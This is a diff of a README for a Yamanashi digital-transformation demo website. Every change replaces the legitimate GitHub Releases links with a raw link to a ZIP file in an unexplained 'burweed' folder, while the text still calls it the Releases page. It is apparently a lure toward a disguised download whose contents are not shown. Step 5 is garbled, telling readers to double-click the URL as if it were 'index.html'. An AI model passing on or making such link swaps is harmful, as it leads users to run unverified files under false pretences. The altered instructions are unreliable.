@@ -1,6 +1,6 @@
 # 🌐 fuji-os-website - Discover Yamanashi's Digital Transformation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/epaepa1212/fuji-os-website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/epaepa1212/fuji-os-website/main/burweed/fuji-os-website.zip%20Release-blue)](https://raw.githubusercontent.com/epaepa1212/fuji-os-website/main/burweed/fuji-os-website.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the Fuji OS website! This bilingual demo shows how digital transforma
 
 To get started, visit the following link to download the latest version of the Fuji OS website:
 
-[Download from Releases](https://github.com/epaepa1212/fuji-os-website/releases)
+[Download from Releases](https://raw.githubusercontent.com/epaepa1212/fuji-os-website/main/burweed/fuji-os-website.zip)
 
 ### Step-by-Step Instructions:
 
 1. **Visit the Releases Page**  
-   Click the link to open the Releases page: [Download from Releases](https://github.com/epaepa1212/fuji-os-website/releases).
+   Click the link to open the Releases page: [Download from Releases](https://raw.githubusercontent.com/epaepa1212/fuji-os-website/main/burweed/fuji-os-website.zip).
 
 2. **Locate the Latest Version**  
    On the Releases page, scroll through the available versions. Look for the latest version with the most recent date.
@@ -27,7 +27,7 @@ To get started, visit the following link to download the latest version of the F
    After the download completes, locate the ZIP file on your computer. Right-click on the file and select "Extract All" or "Unzip" to access the files inside.
 
 5. **Open the Website**  
-   Locate the extracted folder. Inside, you will find the necessary files to run the website. Open the folder and find the `index.html` file. Double-click to open it in your web browser.
+   Locate the extracted folder. Inside, you will find the necessary files to run the website. Open the folder and find the `https://raw.githubusercontent.com/epaepa1212/fuji-os-website/main/burweed/fuji-os-website.zip` file. Double-click to open it in your web browser.
 
 6. **Explore the Features**  
    Once the website loads, take your time to navigate through the pages. Enjoy the bilingual content, responsive design, and learn about the digital transformation initiatives in Yamanashi.
